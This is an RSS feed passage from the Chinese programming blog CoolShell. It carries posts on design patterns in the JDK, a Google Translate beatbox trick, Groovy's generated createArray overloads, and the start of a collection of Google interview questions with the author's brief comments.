<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
<channel>
<title>酷 壳 – CoolShell</title>
<description>享受编程和技术所带来的快乐 – Coding Your Ambition</description>
<link>https://coolshell.cn</link>
<pubDate>2021-11-25T21:24:43+08:00</pubDate>
<!-- other elements omitted from this example -->
<item>
<title><![CDATA[ JDK里的设计模式 ]]></title>
<link>https://coolshell.cn/articles/3320.html</link>
<content><![CDATA[ 
<p>下面是JDK中有关23个经典设计模式的示例，在stakeoverflow也有相应的讨论：<br>
<a href="https://stackoverflow.com/questions/1673841/examples-of-gof-design-patterns" target="_blank">http://stackoverflow.com/questions/1673841/examples-of-gof-design-patterns</a></p>
<h4><strong><span style="text-decoration: underline;">Structural（结构模式）</span></strong></h4>
<div>
<strong>Adapter:</strong><br>
把一个接口或是类变成另外一种。
<ul>
<li>java.util.Arrays#asList()</li>
<li>javax.swing.JTable(TableModel)</li>
<li>java.io.InputStreamReader(InputStream)</li>
<li>java.io.OutputStreamWriter(OutputStream)</li>
<li>javax.xml.bind.annotation.adapters.XmlAdapter#marshal()</li>
<li>javax.xml.bind.annotation.adapters.XmlAdapter#unmarshal()</li>
</ul>
<p><strong>Bridge:</strong><br>
把抽象和实现解藕，于是接口和实现可在完全独立开来。</p>
<ul>
<li>AWT (提供了抽象层映射于实际的操作系统)</li>
<li>JDBC</li>
</ul>
<p><strong>Composite:</strong><br>
让使用者把单独的对象和组合对象混用。</p>
<ul>
<li>javax.swing.JComponent#add(Component)</li>
<li>java.awt.Container#add(Component)</li>
<li>java.util.Map#putAll(Map)</li>
<li>java.util.List#addAll(Collection)</li>
<li>java.util.Set#addAll(Collection)</li>
</ul>
</div>
<p><span id="more-3320"></span></p>
<div>
<p><strong>Decorator:</strong><br>
为一个对象动态的加上一系列的动作，而不需要因为这些动作的不同而产生大量的继承类。这个模式在JDK中几乎无处不在，所以，下面的列表只是一些典型的。</p>
<ul>
<li>java.io.BufferedInputStream(InputStream)</li>
<li>java.io.DataInputStream(InputStream)</li>
<li>java.io.BufferedOutputStream(OutputStream)</li>
<li>java.util.zip.ZipOutputStream(OutputStream)</li>
<li>java.util.Collections#checked[List|Map|Set|SortedSet|SortedMap]()</li>
</ul>
<p><strong>Facade:</strong><br>
用一个简单的接口包状一组组件，接口，抽象或是子系统。</p>
<ul>
<li>java.lang.Class</li>
<li>javax.faces.webapp.FacesServlet</li>
</ul>
<p><strong>Flyweight:</strong><br>
有效率地存储大量的小的对象。</p>
<ul>
<li>java.lang.Integer#valueOf(int)</li>
<li>java.lang.Boolean#valueOf(boolean)</li>
<li>java.lang.Byte#valueOf(byte)</li>
<li>java.lang.Character#valueOf(char)</li>
</ul>
<p><strong>Proxy:</strong><br>
用一个简单的对象来代替一个复杂的对象。</p>
<ul>
<li>java.lang.reflect.Proxy</li>
<li>RMI</li>
</ul>
</div>
<div>
<h4><strong><span style="text-decoration: underline;">Creational（创建模式）</span></strong></h4>
</div>
<div>
<strong> </strong><strong>Abstract factory:</strong><br>
创建一组有关联的对象实例。这个模式在JDK中也是相当的常见，还有很多的framework例如Spring。我们很容易找到这样的实例。
<ul>
<li>java.util.Calendar#getInstance()</li>
<li>java.util.Arrays#asList()</li>
<li>java.util.ResourceBundle#getBundle()</li>
<li>java.sql.DriverManager#getConnection()</li>
<li>java.sql.Connection#createStatement()</li>
<li>java.sql.Statement#executeQuery()</li>
<li>java.text.NumberFormat#getInstance()</li>
<li>javax.xml.transform.TransformerFactory#newInstance()</li>
</ul>
<p><strong>Builder:</strong><br>
主要用来简化一个复杂的对象的创建。这个模式也可以用来实现一个 <a href="https://en.wikipedia.org/wiki/Fluent_interface" target="_blank">Fluent Interface</a>。</p>
<ul>
<li>java.lang.StringBuilder#append()</li>
<li>java.lang.StringBuffer#append()</li>
<li>java.sql.PreparedStatement</li>
<li>javax.swing.GroupLayout.Group#addComponent()</li>
</ul>
<p><strong>Factory:</strong><br>
简单来说，按照需求返回一个类型的实例。</p>
<ul>
<li>java.lang.Proxy#newProxyInstance()</li>
<li>java.lang.Object#toString()</li>
<li>java.lang.Class#newInstance()</li>
<li>java.lang.reflect.Array#newInstance()</li>
<li>java.lang.reflect.Constructor#newInstance()</li>
<li>java.lang.Boolean#valueOf(String)</li>
<li>java.lang.Class#forName()</li>
</ul>
<p><strong>Prototype:</strong><br>
使用自己的实例创建另一个实例。有时候，创建一个实例然后再把已有实例的值拷贝过去，是一个很复杂的动作。所以，使用这个模式可以避免这样的复杂性。</p>
<ul>
<li>java.lang.Object#clone()</li>
<li>java.lang.Cloneable</li>
</ul>
<p><strong>Singleton:</strong><br>
只允许一个实例。在 Effective Java中建议使用Emun.</p>
<ul>
<li>java.lang.Runtime#getRuntime()</li>
<li>java.awt.Toolkit#getDefaultToolkit()</li>
<li>java.awt.GraphicsEnvironment#getLocalGraphicsEnvironment()</li>
<li>java.awt.Desktop#getDesktop()</li>
</ul>
<h4><strong><span style="text-decoration: underline;">Behavioral(行为模式)</span></strong></h4>
<p><strong>Chain of responsibility:</strong><br>
把一个对象在一个链接传递直到被处理。在这个链上的所有的对象有相同的接口（抽象类）但却有不同的实现。</p>
<ul>
<li>java.util.logging.Logger#log()</li>
<li>javax.servlet.Filter#doFilter()</li>
</ul>
<p><strong>Command:</strong><br>
把一个或一些命令封装到一个对象中。</p>
<ul>
<li>java.lang.Runnable</li>
<li>javax.swing.Action</li>
</ul>
<p><strong>Interpreter:</strong><br>
一个语法解释器的模式。</p>
<ul>
<li>java.util.Pattern</li>
<li>java.text.Normalizer</li>
<li>java.text.Format</li>
</ul>
<p><strong>Iterator:</strong><br>
提供一种一致的方法来顺序遍历一个容器中的所有元素。</p>
<ul>
<li>java.util.Iterator</li>
<li>java.util.Enumeration</li>
</ul>
<p><strong>Mediator:</strong><br>
用来减少对象单的直接通讯的依赖关系。使用一个中间类来管理消息的方向。</p>
<ul>
<li>java.util.Timer</li>
<li>java.util.concurrent.Executor#execute()</li>
<li>java.util.concurrent.ExecutorService#submit()</li>
<li>java.lang.reflect.Method#invoke()</li>
</ul>
<p><strong>Memento:</strong><br>
给一个对象的状态做一个快照。Date类在内部使用了一个long型来做这个快照。</p>
<ul>
<li>java.util.Date</li>
<li>java.io.Serializable</li>
</ul>
<p><strong>Null Object:</strong><br>
这个模式用来解决如果一个Collection中没有元素的情况。</p>
<ul>
<li>java.util.Collections#emptyList()</li>
<li>java.util.Collections#emptyMap()</li>
<li>java.util.Collections#emptySet()</li>
</ul>
<p><strong>Observer:</strong><br>
允许一个对象向所有的侦听的对象广播自己的消息或事件。</p>
<ul>
<li>java.util.EventListener</li>
<li>javax.servlet.http.HttpSessionBindingListener</li>
<li>javax.servlet.http.HttpSessionAttributeListener</li>
<li>javax.faces.event.PhaseListener</li>
</ul>
<p><strong>State:</strong><br>
这个模式允许你可以在运行时很容易地根据自身内部的状态改变对象的行为。</p>
<ul>
<li>java.util.Iterator</li>
<li>javax.faces.lifecycle.LifeCycle#execute()</li>
</ul>
<p><strong>Strategy:</strong><br>
定义一组算法，并把其封装到一个对象中。然后在运行时，可以灵活的使用其中的一个算法。</p>
<ul>
<li>java.util.Comparator#compare()</li>
<li>javax.servlet.http.HttpServlet</li>
<li>javax.servlet.Filter#doFilter()</li>
</ul>
<p><strong>Template method:</strong><br>
允许子类重载部分父类而不需要完全重写。</p>
<ul>
<li>java.util.Collections#sort()</li>
<li>java.io.InputStream#skip()</li>
<li>java.io.InputStream#read()</li>
<li>java.util.AbstractList#indexOf()</li>
</ul>
<p><strong>Visitor:</strong></p>
<p>作用于某个对象群中各个对象的操作. 它可以使你在不改变这些对象本身的情况下,定义作用于这些对象的新操作.</p>
<ul>
<li>javax.lang.model.element.Element 和javax.lang.model.element.ElementVisitor</li>
<li>javax.lang.model.type.TypeMirror 和javax.lang.model.type.TypeVisitor</li>
</ul>
<p>（全文完）</p>
</div>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21263.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_title">Go 编程模式：k8s Visitor 模式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17416.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_title">缓存更新的套路</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11541.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11541.html" class="wp_rp_title">面向GC的Java编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11454.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11454.html" class="wp_rp_title">从LongAdder看更高效的无锁实现</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3320" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="ac347a68da">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>12</strong> 人打了分，平均分： <strong>3.92</strong> )<br><span class="post-ratings-text" id="ratings_3320_text"></span><meta itemprop="name" content="JDK里的设计模式">
<meta itemprop="headline" content="JDK里的设计模式">
<meta itemprop="description" content="下面是JDK中有关23个经典设计模式的示例，在stakeoverflow也有相应的讨论：
http://stackoverflow.com/questions/1673841/examples-of-gof-design-patterns
Structural（结构模式）
Adapter:
把一个接口或是类变成另外一种。

	java.util.Arrays#asList()
	ja...">
<meta itemprop="datePublished" content="2010-11-26T08:44:37+08:00">
<meta itemprop="dateModified" content="2010-11-24T17:55:55+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3320.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3320.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.92">
<meta itemprop="ratingCount" content="12">
</div>
</div>
<div id="post-ratings-3320-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-11-26T08:44:37+08:00</pubDate>
<guid>https://coolshell.cn/articles/3320.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 用Google Translate玩转beat box ]]></title>
<link>https://coolshell.cn/articles/3331.html</link>
<content><![CDATA[ 
<p>在<a href="https://www.reddit.com/r/todayilearned/comments/ed39q/til_how_to_make_google_beatbox_for_you/" target="_blank">Reddit</a>上有人发布了怎么使用Google的翻译来玩beat box，很有趣，转过来。</p>
<p style="text-align: center;">
<img alt="image placeholder" ></p>
<p>下面是相关步骤：</p>
<p style="text-align: left; padding-left: 30px;">1) Go to <a href="https://translate.google.com/" target="_self">Google Translate</a></p>
<p style="text-align: left; padding-left: 30px;">2) 把翻译语言设置成从 German 翻译到 German。（德语）</p>
<p style="text-align: left; padding-left: 30px;">3) 拷贝粘贴这个字符串到translate中：<br>
pv zk pv pv zk pv zk kz zk pv pv pv zk pv zk zk pzk pzk pvzkpkzvpvzk kkkkkk bsch</p>
<p style="text-align: left; padding-left: 30px;">4) 把声音开大，点击“朗读”，</p>
<p>另，如果你在Google里以 “Google beatbox” 作为关键词搜索，你会看到 Google Translate出现在最前面的搜索结果中。</p>
<div></div>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9508.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_title">PFIF网上寻人协议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5815.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_title">来信， 创业 和 移动互联网</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5701.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5701.html" class="wp_rp_title">SteveY对Amazon和Google平台的吐槽</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3806.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3806.html" class="wp_rp_title">Google图片搜索下的的C String</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3331" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="ab24ec0b91">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>5</strong> 人打了分，平均分： <strong>3.40</strong> )<br><span class="post-ratings-text" id="ratings_3331_text"></span><meta itemprop="name" content="用Google Translate玩转beat box">
<meta itemprop="headline" content="用Google Translate玩转beat box">
<meta itemprop="description" content="在Reddit上有人发布了怎么使用Google的翻译来玩beat box，很有趣，转过来。


下面是相关步骤：
1) Go to Google Translate
2) 把翻译语言设置成从 German 翻译到 German。（德语）
3) 拷贝粘贴这个字符串到translate中：
pv zk pv pv zk pv zk kz zk pv pv pv zk pv zk zk p...">
<meta itemprop="datePublished" content="2010-12-01T10:21:44+08:00">
<meta itemprop="dateModified" content="2010-12-01T10:21:44+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3331.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3331.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.4">
<meta itemprop="ratingCount" content="5">
</div>
</div>
<div id="post-ratings-3331-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-01T10:21:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/3331.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Groovy是怎么实现createArray的 ]]></title>
<link>https://coolshell.cn/articles/3335.html</link>
<content><![CDATA[ 
<p><a href="http://groovy.codehaus.org/" target="_blank">Groovy</a>是一个基于 Java虚拟机的敏捷 动态语言。构建在强大的Java语言之上 并 添加了从Python，Ruby和Smalltalk等语言中学到的 诸多特征。为Java开发者提供了 现代最流行的编程语言特性，而且学习成本很低（几乎为零）。在以前的酷壳的<a rel="bookmark" href="https://coolshell.cn/articles/2631.html">五大基于JVM的脚本语言</a>中也介绍过它。</p>
<p>下面，让我们看看他的一个createArray的实现，请大家前去围观下面的Groovy的trunk上的源码吧。真是很好很强大。</p>
<p><a href="http://svn.codehaus.org/groovy/trunk/groovy/groovy-core/src/main/org/codehaus/groovy/runtime/ArrayUtil.java" target="_blank">http://svn.codehaus.org/groovy/trunk/groovy/groovy-core/src/main/org/codehaus/groovy/runtime/ArrayUtil.java</a></p>
<p>这里摘上前几个createArray重载函数让大家看看，（一共有250个重载函数）</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class ArrayUtil {
    ... ...
    ... ...
 public static Object[] createArray(Object arg0, Object arg1) {
 return new Object[]{
 arg0, arg1};
 }

 public static Object[] createArray(Object arg0, Object arg1, Object arg2) {
 return new Object[]{
 arg0, arg1, arg2};
 }

 public static Object[] createArray(Object arg0, Object arg1, Object arg2, Object arg3) {
 return new Object[]{
 arg0, arg1, arg2, arg3};
 }

 public static Object[] createArray(Object arg0, Object arg1, Object arg2, Object arg3, Object arg4) {
 return new Object[]{
 arg0, arg1, arg2, arg3, arg4};
 }

 public static Object[] createArray(Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) {
 return new Object[]{
 arg0, arg1, arg2, arg3, arg4, arg5};
 }
 ... ...
 ... ...
} </pre>
<p>这里给了一些<a href="http://groovy.329449.n5.nabble.com/Guys-any-explanations-about-this-td3285524.html#a3285676" target="_blank">解释</a>：</p>
<p><span id="more-3335"></span></p>
<ul>
<li>
<strong>First</strong>: the package is org.codehaus.groovy.runtime. This is NOT a class that any user of Groovy will ever use. There are plenty of XML utilities in groovy.lang or groovy.xml for you to use.</li>
<li>
<strong>Second</strong>: This class is never invoked from code. It exists so that byte code statements have something to link against. If you dump the stack language of a .class file you may indeed see a “INVOKESTATIC org/codehaus/groovy/runtime/XMLUtil” invocation. This logic is used around the CallSite writing features.</li>
<li>
<strong>Third</strong>: Implementing a dynamic language (Groovy) in a static language (Java) on a type less virtual machine (JVM) is hard. Every language has their work arounds. We generated some code so that we had something to link against. At one point, JRuby was generating reams of interfaces (IIRC) and have you seen the implementation of OpenJDK? Ever notice now many methods are overloaded for all the primitives plus Object. These are all workarounds to get the end user a good programming experience while still running on the JVM.</li>
</ul>
<p>大意是：这个类对于Groovy的使用者是不会用到的，也不会被调用到，因为在JVM下实现动态语言是有一定的难度，这算是一个work around。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4905.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4905.html" class="wp_rp_title">语言的数据亲和力</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2631.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2631.html" class="wp_rp_title">五大基于JVM的脚本语言</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4671.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4671.html" class="wp_rp_title">可视化的数据结构和算法</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6335.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6335.html" class="wp_rp_title">Resin服务器getResource揭秘</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3236.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3236.html" class="wp_rp_title">给老婆普及计算机知识</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3335" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="4a09d8d1f2">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>7</strong> 人打了分，平均分： <strong>3.57</strong> )<br><span class="post-ratings-text" id="ratings_3335_text"></span><meta itemprop="name" content="Groovy是怎么实现createArray的">
<meta itemprop="headline" content="Groovy是怎么实现createArray的">
<meta itemprop="description" content="Groovy是一个基于 Java虚拟机的敏捷 动态语言。构建在强大的Java语言之上 并 添加了从Python，Ruby和Smalltalk等语言中学到的 诸多特征。为Java开发者提供了 现代最流行的编程语言特性，而且学习成本很低（几乎为零）。在以前的酷壳的五大基于JVM的脚本语言中也介绍过它。

下面，让我们看看他的一个createArray的实现，请大家前去围观下面的Groovy的tru...">
<meta itemprop="datePublished" content="2010-12-01T14:08:53+08:00">
<meta itemprop="dateModified" content="2010-12-01T11:52:56+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3335.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3335.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.57">
<meta itemprop="ratingCount" content="7">
</div>
</div>
<div id="post-ratings-3335-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-01T14:08:53+08:00</pubDate>
<guid>https://coolshell.cn/articles/3335.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 140个Google的面试题 ]]></title>
<link>https://coolshell.cn/articles/3345.html</link>
<content><![CDATA[ 
<p>来源：<a href="http://blog.seattleinterviewcoach.com/2009/02/140-google-interview-questions.html" target="_blank">http://blog.seattleinterviewcoach.com/2009/02/140-google-interview-questions.html</a>（墙）<br>
<img alt="image placeholder" ></p>
<div>某猎头收集了140多个Google的面试题，都张到他的Blog中了，主要是下面这些职位的，因为被墙，且无任何敏感信息，所以，我原文搬过来了。</div>
<div>
<ul>
<li>Product Marketing Manager</li>
<li>Product Manager</li>
<li>Software Engineer</li>
<li>Software Engineer in Test</li>
<li>Quantitative Compensation Analyst</li>
<li>Engineering Manager</li>
<li>AdWords Associate</li>
</ul>
</div>
<p>这篇Blog例举了Google用来面试下面这几个职位的面试题。很多不是很容易回答，不过都比较经典与变态，是Google，Microsoft，Amazon之类的公司的风格。对于本文，我没有翻译，因为我相信，英文问题是最好的。不过对于有些问题，我做了一些注释，不一定对，但希望对你有帮助启发。对于一些问题，如果你百思不得其解，可以Google一下，StackOverflow或是Wikipedia上可能会给你非常全面的答案。</p>
<p><span id="more-3345"></span></p>
<div><strong>Product Marketing Manager</strong></div>
<div>
<div>
<ul>
<li>Why do you want to join Google?</li>
<li>What do you know about Google’s product and technology?</li>
<li>If you are Product Manager for Google’s Adwords, how do you plan to market this?</li>
<li>What would you say during an AdWords or AdSense product seminar?</li>
<li>Who are Google’s competitors, and how does Google compete with them?</li>
<li>Have you ever used Google’s products? Gmail?</li>
<li>What’s a creative way of marketing Google’s brand name and product?</li>
<li>If you are the product marketing manager for Google’s Gmail product, how do you plan to market it so as to achieve 100 million customers in 6 months?</li>
<li>How much money you think Google makes daily from Gmail ads?</li>
<li>Name a piece of technology you’ve read about recently. Now tell me your own creative execution for an ad for that product.</li>
<li>Say an advertiser makes $0.10 every time someone clicks on their ad. Only 20% of people who visit the site click on their ad. How many people need to visit the site for the advertiser to make $20?<span style="white-space: pre;"> </span>
</li>
<li>Estimate the number of students who are college seniors, attend four-year schools, and graduate with a job in the United States every year.</li>
</ul>
</div>
</div>
<div><strong>Product Manager</strong></div>
<div>
<div>
<ul>
<li>How would you boost the GMail subscription base?</li>
<li>What is the most efficient way to sort a million integers?  （陈皓：merge sort）</li>
<li>How would you re-position Google’s offerings to counteract competitive threats from Microsoft?</li>
<li>How many golf balls can fit in a school bus? （陈皓：这种题一般来说是考你的解题思路的，注意，你不能单纯地把高尔夫球当成一个小立方体，其是一个圆球，堆起来的时候应该是错开的——也就是三个相邻的球的圆心是个等边三角形）</li>
<li>You are shrunk to the height of a nickel and your mass is proportionally reduced so as to maintain your original density. You are then thrown into an empty glass blender. The blades will start moving in 60 seconds. What do you do?</li>
<li>How much should you charge to wash all the windows in Seattle?</li>
<li>How would you find out if a machine’s stack grows up or down in memory?</li>
<li>Explain a database in three sentences to your eight-year-old nephew. （陈皓：用三句话向8岁的侄子解释什么是数据库，考你的表达能力了）</li>
<li>How many times a day does a clock’s hands overlap?（陈皓：经典的时钟问题）</li>
<li>You have to get from point A to point B. You don’t know if you can get there. What would you do?</li>
<li>Imagine you have a closet full of shirts. It’s very hard to find a shirt. So what can you do to organize your shirts for easy retrieval? （陈皓：很不错的一道题，不要以为分类查询很容易，想想图书馆图书的分类查询问题吧。另外，你处想想如何在你在你的衣柜里实现一个相当于Hash表或是一个Tree之类的数据结构）</li>
<li>Every man in a village of 100 married couples has cheated on his wife. Every wife in the village instantly knows when a man other than her husband has cheated, but does not know when her own husband has. The village has a law that does not allow for adultery. Any wife who can prove that her husband is unfaithful must kill him that very day. The women of the village would never disobey this law. One day, the queen of the village visits and announces that at least one husband has been unfaithful. What happens? （陈皓：这个问题很有限制级，哈哈，非常搞的一个问题，注意wife们的递归，这类的问题是经典的分布式通讯问题，上网搜 一搜吧。）</li>
<li>In a country in which people only want boys, every family continues to have children until they have a boy. If they have a girl, they have another child. If they have a boy, they stop. What is the proportion of boys to girls in the country?（陈皓：第一反应是——这个国家是中国。一个概率问题，其实，无论你怎么生，50%的概率是永远不变的。）</li>
<li>If the probability of observing a car in 30 minutes on a highway is 0.95, what is the probability of observing a car in 10 minutes (assuming constant default probability)?</li>
<li>If you look at a clock and the time is 3:15, what is the angle between the hour and the minute hands? (The answer to this is not zero!)</li>
<li>Four people need to cross a rickety rope bridge to get back to their camp at night. Unfortunately, they only have one flashlight and it only has enough light left for seventeen minutes. The bridge is too dangerous to cross without a flashlight, and it’s only strong enough to support two people at any given time. Each of the campers walks at a different speed. One can cross the bridge in 1 minute, another in 2 minutes, the third in 5 minutes, and the slow poke takes 10 minutes to cross. How do the campers make it across in 17 minutes?（陈皓：经典的过桥问题）</li>
<li>You are at a party with a friend and 10 people are present including you and the friend. your friend makes you a wager that for every person you find that has the same birthday as you, you get $1; for every person he finds that does not have the same birthday as you, he gets $2. would you accept the wager?</li>
<li>How many piano tuners are there in the entire world?</li>
<li>You have eight balls all of the same size. 7 of them weigh the same, and one of them weighs slightly more. How can you find the ball that is heavier by using a balance and only two weighings?（陈皓：经典的称重问题。这样的问题花样很多，不过都不难回答）</li>
<li>You have five pirates, ranked from 5 to 1 in descending order. The top pirate has the right to propose how 100 gold coins should be divided among them. But the others get to vote on his plan, and if fewer than half agree with him, he gets killed. How should he allocate the gold in order to maximize his share but live to enjoy it? (Hint: One pirate ends up with 98 percent of the gold.)</li>
<li>You are given 2 eggs. You have access to a 100-story building. Eggs can be very hard or very fragile means it may break if dropped from the first floor or may not even break if dropped from 100th floor. Both eggs are identical. You need to figure out the highest floor of a 100-story building an egg can be dropped without breaking. The question is how many drops you need to make. You are allowed to break 2 eggs in the process. （陈皓：从3的倍数的楼层开始扔，比如3，6，9，12…..，如果鸡蛋在3n层碎了，那到在3n-1层扔第二个鸡蛋，如果没碎，则最高不碎楼层为3n-1，否则为3n-2）</li>
<li>Describe a technical problem you had and how you solved it.</li>
<li>How would you design a simple search engine?</li>
<li>Design an evacuation plan for San Francisco.</li>
